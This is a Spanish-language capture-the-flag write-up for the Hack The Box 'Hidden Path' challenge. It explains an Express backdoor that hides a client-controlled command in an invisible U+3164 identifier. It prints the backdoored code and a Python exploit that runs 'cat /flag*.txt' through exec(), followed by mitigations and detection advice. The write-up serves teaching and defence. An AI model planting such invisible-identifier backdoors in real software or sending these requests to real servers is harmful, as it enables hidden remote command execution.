---
challenge: Hidden Path
category: Misc
type: Misc
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [misc, javascript, unicode, backdoor, rce]
---

# Hidden Path — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags reales.

## TL;DR

Una app Express solo ejecuta comandos de una lista fija, pero el código tiene un **parámetro invisible**: `const { choice,ㅤ} = req.body;` y una coma final en el array `commands` con la misma variable. Ese carácter es `U+3164` (HANGUL FILLER), válido como identificador en JavaScript y visualmente idéntico a un espacio. Enviando `choice=6` y `ㅤ=<comando>` se ejecuta la orden elegida.

## Enunciado y superficie

- Categoría Misc, dificultad Easy; Business CTF 2024.
- Se entrega el código de `app.js` y una instancia web.
- El enunciado habla de una puerta trasera en un endpoint de comprobación del sistema.

## Reconocimiento

```bash
curl -s http://<IP>:<PUERTO>/ | head
```

La página carga una lista de botones de radio y un `submitCommand()` que hace `POST /server_status` con `choice=<índice>`. El servidor responde con la salida del comando seleccionado.

## Análisis del código

```js
app.post('/server_status', async (req, res) => {
    const { choice,ㅤ} = req.body;
    const integerChoice = +choice;
    if (isNaN(integerChoice)) {
        return res.status(400).send('Invalid choice: must be a number');
    }

    const commands = [
        'free -m',
        'uptime',
        'iostat',
        'mpstat',
        'netstat',
        'ps aux',ㅤ
    ];

    if (integerChoice < 0 || integerChoice >= commands.length) {
        return res.status(400).send('Invalid choice: out of bounds');
    }

    exec(commands[integerChoice], (error, stdout) => { ... });
});
```

Leído con un editor normal parece una coma final y un espacio; en realidad hay una variable llamada `ㅤ` en el destructuring y otra vez como último elemento del array. La coma final es válida en JavaScript, así que el array tiene **7** elementos y el índice 6 es alcanzable.

## Explicación del fallo

El diseño pretende evitar la inyección de comandos enviando índices en lugar de cadenas, pero la variable oculta rompe esa premisa: el cliente controla el séptimo elemento del array. La comprobación de rango se hace sobre `commands.length`, que ya incluye el elemento inyectado.

## Reproducción local

```bash
npm install express
node app.js
```

El fallo se reproduce con el mismo POST; no hace falta la instancia remota para validar el índice 6.

## Explotación

```python
import requests

url = "http://<IP>:<PUERTO>/server_status"
data = {
    "choice": 6,
    "\u3164": "cat /flag*.txt"   # HANGUL FILLER
}
print(requests.post(url, data=data).text)
```

- `choice=6` pasa el rango porque el array mide 7.
- El cuerpo incluye la clave `ㅤ` con el comando; Express la entrega en `req.body` y el destructuring la asigna.
- `exec` la ejecuta y devuelve `stdout`.

La ruta exacta del endpoint se toma del código (`/server_status`); algunas copias del writeup usan otra ruta, pero el `app.post` es la referencia.

## Evidencia

- Petición con `choice=6` y la clave `\u3164`.
- Salida del comando en la respuesta HTTP.
- Flag guardada en `private/`.

## Lecciones aprendidas

- **Caracteres invisibles**: `U+3164` no se ve en la mayoría de editores; hay que revisar el hexdump o activar el resaltado Unicode.
- **Copiar y pegar**: al replicar el payload, el carácter se pierde con facilidad; enviarlo como `\u3164` evita el problema.
- **Coma final**: en JS no es un error, y aquí es la pista de que hay un elemento más.

## Mitigaciones y detección

- No se construyen listas de comandos con variables de `req.body`; se usan constantes y una asignación explícita índice → comando.
- Validar el cuerpo contra un esquema estricto (`choice` numérico y nada más) y rechazar claves desconocidas.
- Detección: cuerpos con claves que no son ASCII imprimible, o comandos ejecutados cuyo índice no existe en la lista publicada; revisar el código con un linter que marque caracteres no ASCII.

## Referencias

- <https://github.com/hackthebox/business-ctf-2024/tree/main/misc/%5BEasy%5D%20Hidden%20Path>
- <https://certitude.consulting/blog/en/invisible-backdoor/>
- <https://blog.ikuamike.io/posts/2024/htb_business_ctf_2024_misc>
